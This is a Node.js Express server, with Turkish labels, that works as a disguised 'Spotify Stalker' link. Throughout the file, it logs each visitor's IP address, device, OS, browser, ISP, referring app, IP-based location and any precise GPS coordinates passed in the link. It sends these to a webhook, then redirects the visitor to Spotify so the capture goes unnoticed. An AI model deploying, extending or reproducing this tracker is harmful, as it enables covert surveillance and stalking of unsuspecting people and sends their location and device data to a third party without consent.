require('dotenv').config();
const express = require('express');
const path = require('path');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const https = require('https');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;
const WEBHOOK = process.env.WEBHOOK;
const REDIRECT = process.env.REDIRECT || 'https://open.spotify.com';

if (!WEBHOOK) {
  console.error('WEBHOOK environment variable is required');
  process.exit(1);
}

app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
app.use(rateLimit({ windowMs: 60 * 1000, max: 30, message: 'Too many requests' }));

function fetchJSON(url) {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith('https') ? https : http;
    mod.get(url, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch (e) { reject(new Error('Invalid JSON: ' + e.message)); }
      });
    }).on('error', reject);
  });
}

function postJSON(url, payload) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(payload);
    const u = new URL(url);
    const opts = {
      hostname: u.hostname,
      path: u.pathname + u.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    };
    const req = https.request(opts, res => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) resolve(body);
        else reject(new Error('HTTP ' + res.statusCode + ': ' + body));
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function codeToFlag(code) {
  if (!code || code.length !== 2) return '';
  return String.fromCodePoint(0x1F1E6 + code.charCodeAt(0) - 65, 0x1F1E6 + code.charCodeAt(1) - 65);
}

function parseUA(ua) {
  let os = 'Bilinmiyor', browser = 'Bilinmiyor', device = '-', app = 'Doğrudan / Bilinmiyor';
  if (/WhatsApp/i.test(ua)) app = 'WhatsApp';
  else if (/Instagram/i.test(ua)) app = 'Instagram';
  else if (/FBAN|FBAV|Facebook/i.test(ua)) app = 'Facebook';
  else if (/Messenger/i.test(ua)) app = 'Facebook Messenger';
  else if (/Telegram/i.test(ua)) app = 'Telegram';
  else if (/Twitter|Tweetbot/i.test(ua)) app = 'Twitter/X';
  else if (/Discord/i.test(ua)) app = 'Discord';
  else if (/LinkedIn/i.test(ua)) app = 'LinkedIn';
  else if (/Snapchat/i.test(ua)) app = 'Snapchat';
  else if (/TikTok/i.test(ua)) app = 'TikTok';
  else if (/Reddit/i.test(ua)) app = 'Reddit';
  else if (/okhttp/i.test(ua)) app = 'Android Uygulama';
  if (/iPhone/i.test(ua)) {
    os = 'iOS';
    const iphones = {
      'iPhone1,1':'iPhone','iPhone1,2':'iPhone 3G','iPhone2,1':'iPhone 3GS','iPhone3,1':'iPhone 4','iPhone3,3':'iPhone 4','iPhone4,1':'iPhone 4S',
      'iPhone5,1':'iPhone 5','iPhone5,2':'iPhone 5','iPhone5,3':'iPhone 5c','iPhone5,4':'iPhone 5c','iPhone6,1':'iPhone 5s','iPhone6,2':'iPhone 5s',
      'iPhone7,1':'iPhone 6 Plus','iPhone7,2':'iPhone 6','iPhone8,1':'iPhone 6s','iPhone8,2':'iPhone 6s Plus','iPhone8,4':'iPhone SE',
      'iPhone9,1':'iPhone 7','iPhone9,3':'iPhone 7','iPhone9,2':'iPhone 7 Plus','iPhone9,4':'iPhone 7 Plus',
      'iPhone10,1':'iPhone 8','iPhone10,4':'iPhone 8','iPhone10,2':'iPhone 8 Plus','iPhone10,5':'iPhone 8 Plus','iPhone10,3':'iPhone X','iPhone10,6':'iPhone X',
      'iPhone11,2':'iPhone XS','iPhone11,4':'iPhone XS Max','iPhone11,6':'iPhone XS Max','iPhone11,8':'iPhone XR',
      'iPhone12,1':'iPhone 11','iPhone12,3':'iPhone 11 Pro','iPhone12,5':'iPhone 11 Pro Max','iPhone12,8':'iPhone SE 2',
      'iPhone13,1':'iPhone 12 mini','iPhone13,2':'iPhone 12','iPhone13,3':'iPhone 12 Pro','iPhone13,4':'iPhone 12 Pro Max',
      'iPhone14,2':'iPhone 13 Pro','iPhone14,3':'iPhone 13 Pro Max','iPhone14,4':'iPhone 13 mini','iPhone14,5':'iPhone 13','iPhone14,6':'iPhone SE 3',
      'iPhone14,7':'iPhone 14','iPhone14,8':'iPhone 14 Plus',
      'iPhone15,1':'iPhone 14 Pro','iPhone15,2':'iPhone 14 Pro Max','iPhone15,3':'iPhone 15','iPhone15,4':'iPhone 15 Plus','iPhone15,5':'iPhone 15 Pro','iPhone15,6':'iPhone 15 Pro Max',
      'iPhone16,1':'iPhone 16 Pro','iPhone16,2':'iPhone 16 Pro Max','iPhone16,3':'iPhone 16','iPhone16,4':'iPhone 16 Plus',
      'iPhone16,5':'iPhone 16e','iPhone17,1':'iPhone 17','iPhone17,2':'iPhone 17 Plus','iPhone17,3':'iPhone 17 Pro','iPhone17,4':'iPhone 17 Pro Max',
      'iPhone17,5':'iPhone 17 Air','iPhone17,6':'iPhone 17 Ultra'
    };
    let m = ua.match(/iPhone\d+,\d+/);
    device = (m && iphones[m[0]]) || (m ? m[0] : 'iPhone');
  } else if (/iPad/i.test(ua)) {
    os = 'iOS';
    const ipads = {
      'iPad1,1':'iPad','iPad2,1':'iPad 2','iPad2,2':'iPad 2','iPad2,3':'iPad 2','iPad2,4':'iPad 2','iPad2,5':'iPad mini','iPad2,6':'iPad mini','iPad2,7':'iPad mini',
      'iPad3,1':'iPad 3','iPad3,2':'iPad 3','iPad3,3':'iPad 3','iPad3,4':'iPad 4','iPad3,5':'iPad 4','iPad3,6':'iPad 4',
      'iPad4,1':'iPad Air','iPad4,2':'iPad Air','iPad4,3':'iPad Air','iPad4,4':'iPad mini 2','iPad4,5':'iPad mini 2','iPad4,6':'iPad mini 2','iPad4,7':'iPad mini 3','iPad4,8':'iPad mini 3','iPad4,9':'iPad mini 3',
      'iPad5,1':'iPad mini 4','iPad5,2':'iPad mini 4','iPad5,3':'iPad Air 2','iPad5,4':'iPad Air 2',
      'iPad6,3':'iPad Pro 9.7','iPad6,4':'iPad Pro 9.7','iPad6,7':'iPad Pro 12.9','iPad6,8':'iPad Pro 12.9','iPad6,11':'iPad 5','iPad6,12':'iPad 5',
      'iPad7,1':'iPad Pro 12.9 2G','iPad7,2':'iPad Pro 12.9 2G','iPad7,3':'iPad Pro 10.5','iPad7,4':'iPad Pro 10.5','iPad7,5':'iPad 6','iPad7,6':'iPad 6','iPad7,11':'iPad 7','iPad7,12':'iPad 7',
      'iPad8,1':'iPad Pro 11','iPad8,2':'iPad Pro 11','iPad8,3':'iPad Pro 11','iPad8,4':'iPad Pro 11','iPad8,5':'iPad Pro 12.9 3G','iPad8,6':'iPad Pro 12.9 3G','iPad8,7':'iPad Pro 12.9 3G','iPad8,8':'iPad Pro 12.9 3G',
      'iPad8,9':'iPad Pro 11 2G','iPad8,10':'iPad Pro 11 2G','iPad8,11':'iPad Pro 12.9 4G','iPad8,12':'iPad Pro 12.9 4G',
      'iPad11,1':'iPad mini 5','iPad11,2':'iPad mini 5','iPad11,3':'iPad Air 3','iPad11,4':'iPad Air 3','iPad11,6':'iPad 8','iPad11,7':'iPad 8',
      'iPad12,1':'iPad 9','iPad12,2':'iPad 9',
      'iPad13,1':'iPad Air 4','iPad13,2':'iPad Air 4','iPad13,4':'iPad Pro 11 3G','iPad13,5':'iPad Pro 11 3G','iPad13,6':'iPad Pro 11 3G','iPad13,7':'iPad Pro 11 3G',
      'iPad13,8':'iPad Pro 12.9 5G','iPad13,9':'iPad Pro 12.9 5G','iPad13,10':'iPad Pro 12.9 5G','iPad13,11':'iPad Pro 12.9 5G',
      'iPad13,16':'iPad Air 5','iPad13,17':'iPad Air 5','iPad13,18':'iPad 10','iPad13,19':'iPad 10',
      'iPad14,1':'iPad mini 6','iPad14,2':'iPad mini 6',
      'iPad14,3':'iPad Pro 11 4G','iPad14,4':'iPad Pro 11 4G','iPad14,5':'iPad Pro 12.9 6G','iPad14,6':'iPad Pro 12.9 6G',
      'iPad14,8':'iPad Air 6 (11)','iPad14,9':'iPad Air 6 (11)','iPad14,10':'iPad Air 6 (13)','iPad14,11':'iPad Air 6 (13)',
      'iPad15,3':'iPad Pro 11 5G (M4)','iPad15,4':'iPad Pro 11 5G (M4)','iPad15,5':'iPad Pro 13 (M4)','iPad15,6':'iPad Pro 13 (M4)','iPad15,7':'iPad Air 7','iPad15,8':'iPad Air 7',
      'iPad16,1':'iPad 11','iPad16,2':'iPad 11','iPad16,3':'iPad mini 7','iPad16,4':'iPad mini 7','iPad16,5':'iPad Pro 11 6G','iPad16,6':'iPad Pro 11 6G','iPad16,7':'iPad Pro 13 2G','iPad16,8':'iPad Pro 13 2G'
    };
    let found = '';
    for (const [id, name] of Object.entries(ipads)) { if (ua.includes(id)) { found = name; break; } }
    device = found || ua.match(/iPad\d+,\d+/)?.[0] || 'iPad';
  } else if (/Android/i.test(ua)) {
    let m = ua.match(/\(([^;]+);\s*([^;)]+)/);
    device = m ? m[2].trim() : (/Mobile/i.test(ua) ? 'Android Telefon' : 'Android Tablet');
  }
  if (/Windows NT 10/i.test(ua)) os = 'Windows 10';
  else if (/Windows NT 11/i.test(ua)) os = 'Windows 11';
  else if (/Windows NT 6\.3/i.test(ua)) os = 'Windows 8.1';
  else if (/Windows NT 6\.2/i.test(ua)) os = 'Windows 8';
  else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
  else if (/Mac OS X (\d+[._]\d+)/.test(ua)) os = 'macOS ' + RegExp.$1.replace('_', '.');
  else if (/Linux/i.test(ua) && !/Android/i.test(ua)) os = 'Linux';
  if (device === '-' && os !== 'Bilinmiyor') device = 'PC';
  if (/Chrome/i.test(ua) && !/Edg|OPR/i.test(ua)) { let m = ua.match(/Chrome\/([\d.]+)/); browser = 'Chrome ' + (m ? m[1] : ''); }
  else if (/Firefox/i.test(ua)) { let m = ua.match(/Firefox\/([\d.]+)/); browser = 'Firefox ' + (m ? m[1] : ''); }
  else if (/Edg/i.test(ua)) { let m = ua.match(/Edg\/([\d.]+)/); browser = 'Edge ' + (m ? m[1] : ''); }
  else if (/OPR/i.test(ua)) { let m = ua.match(/OPR\/([\d.]+)/); browser = 'Opera ' + (m ? m[1] : ''); }
  else if (/Safari/i.test(ua)) { let m = ua.match(/Version\/([\d.]+)/); browser = 'Safari ' + (m ? m[1] : ''); }
  return { os, browser, device, app };
}

function fmtDate(d) {
  return String(d.getDate()).padStart(2,'0')+'.'+String(d.getMonth()+1).padStart(2,'0')+'.'+d.getFullYear()+' '+String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0');
}

function relDate(d) {
  const n = new Date();
  const h = String(d.getHours()).padStart(2,'0')+':'+String(d.getMinutes()).padStart(2,'0');
  if (n-d < 86400000 && d.getDate()===n.getDate()) return 'bugün '+h;
  const y = new Date(n); y.setDate(y.getDate()-1);
  if (d.getDate()===y.getDate()&&d.getMonth()===y.getMonth()&&d.getFullYear()===y.getFullYear()) return 'dün '+h;
  return fmtDate(d);
}

function escapeHtml(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;');
}

function sanitize(s) {
  return typeof s === 'string' ? s.replace(/[<>"'&]/g, '') : '';
}

app.get('/', async (req, res, next) => {
  if (!req.query.geo) {
    return next();
  }
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    const uaStr = req.headers['user-agent'] || '';
    const referrer = req.headers['referer'] || '';
    let { os, browser, device, app: detectedApp } = parseUA(uaStr);
    if (req.query.device) device = sanitize(req.query.device);
    const source = detectedApp !== 'Doğrudan / Bilinmiyor' ? detectedApp : (referrer || 'Doğrudan / Bilinmiyor');
    let geo = {};
    try { geo = await fetchJSON('http://ip-api.com/json/'+ip+'?fields=city,country,countryCode,isp,org,lat,lon'); } catch(e) { console.error('Geo error:', e.message); }
    const flag = codeToFlag(geo.countryCode);
    const eksKonum = geo.city ? geo.city+', '+geo.country : 'Bilinmiyor';
    let mapsLink = '';
    let konum = flag+' '+eksKonum;
    let geoDurum = '';
    if (req.query.geo === 'izin_verdi') {
      const lat = sanitize(req.query.lat || '');
      const lon = sanitize(req.query.lon || '');
      if (lat && lon) mapsLink = 'https://www.google.com/maps?q='+lat+','+lon;
      let acc = req.query.acc ? ' (±'+sanitize(req.query.acc)+'m)' : '';
      konum = flag+' '+eksKonum+'\n:crosshairs: Kesin konum:\n[Haritada göster]('+mapsLink+')'+acc;
      geoDurum = 'Konuma izin verdi :white_check_mark:';
    } else if (req.query.geo === 'izin_vermedi') {
      geoDurum = 'Konuma izin vermedi :no_entry:';
    } else if (geo.lat) {
      mapsLink = 'https://www.google.com/maps?q='+geo.lat+','+geo.lon;
      konum = flag+' '+eksKonum+'\n[Haritada göster]('+mapsLink+')';
      geoDurum = 'IP bazlı konum';
    }
    if (geoDurum) konum += '\n_'+geoDurum+'_';
    const now = new Date();
    const fields = [
      { name: ':round_pushpin: Konum', value: konum, inline: true },
      { name: ':id: IP', value: ip, inline: true },
      { name: ':mobile_phone: Cihaz', value: device, inline: true },
      { name: ':desktop: İşletim Sistemi', value: os, inline: true },
      { name: ':globe_with_meridians: Tarayıcı', value: browser, inline: true },
      { name: ':satellite: ISS', value: geo.isp || geo.org || 'Bilinmiyor', inline: true },
      { name: ':link: Yönlendiren', value: source, inline: true },
      { name: ':alarm_clock: Tarih', value: fmtDate(now), inline: true }
    ];
    await postJSON(WEBHOOK, { embeds: [{ title: 'Spotify Stalkeri !!!', color: 0x1DB954, fields, footer: { text: 'Spotify Stalker · 37xw • '+relDate(now) } }] });
  } catch(e) { console.error('Webhook error:', e.message); }

  const safeRedirect = escapeHtml(REDIRECT);
  res.send('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="0;url='+safeRedirect+'"><script>location.replace('+JSON.stringify(REDIRECT)+')</script></head><body></body></html>');
});

app.use(express.static(__dirname));

app.listen(PORT, () => console.log('Server running on port '+PORT));
